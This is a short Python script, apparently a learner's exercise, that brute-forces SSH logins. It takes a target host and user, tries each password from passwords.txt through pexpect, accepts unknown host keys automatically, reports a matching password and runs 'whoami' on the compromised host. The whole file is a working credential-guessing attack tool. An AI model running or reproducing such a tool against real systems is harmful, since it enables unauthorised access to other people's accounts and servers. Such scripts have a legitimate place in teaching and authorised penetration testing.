#!/usr/bin/python3

import pexpect
import termcolor

#list of input prompts that may be givne in terminal after login in to ssh
PROMPT = ['# ', '>>> ', '> ', '\$ ']

#sending commands to run on target system and any given expeected prompts. receving response
def send_command(child, command):
    child.sendline(command)
    child.expect(PROMPT)
    #child.befor will print output form target system. .decode() needed as out put is encoded
    print(child.before.decode())
    

#Automating ssh conection
def connect(user, host, password):
    #ssh_newkey string respons that wil be genarated after ssh command is given in terminal
    ssh_newkey = 'Are you sure you want to continue connecting'
    
    #connStr set = to sting to run ssh command in terminal
    connStr = 'ssh ' + user +'@' + host
    
    #pexpect.spawn will automatically run what is passed in as parameter (connStr)
    child = pexpect.spawn(connStr)
    #child.expect response after running ssh call in terminal
    #ssh respons give as a list
    #ssh_newkey: is string above 
    #'[P,p]assword: ': maybe ethier uper or lower case p in password 
    #ret set = to respons which is 0(False) or 1(True)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P,p]assword: '])
    
    #lodgic to deal with returend respons. now stored in ret
    if ret == 0:
        print("[-] Error connecting")
        return
    if ret == 1:
        #sendline() sends response. (this is give as command in terminal)
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P,p]assword: '])
        if ret == 0:
            print('[-] Error Connecting')
            return 
    #more expected responses from ssh and then return child
    child.sendline(password)
    child.expect(PROMPT, timeout = 0.5)
    return child

def main():
    host = input("Enter host ip to Bruteforce:")
    user = input("Enter user to Bruteforce:")
    file = open('passwords.txt', 'r')
    
    for password in file.readlines():
        password =  password.strip('\n')
        try:
            child = connect(user, host, password)
            print(termcolor.colored(f"[+] password found: {password}", 'green'))
            send_command(child, 'whoami')
        except:
            print(termcolor.colored("[-] Password not found", 'red'))
    
    
main()
        
    

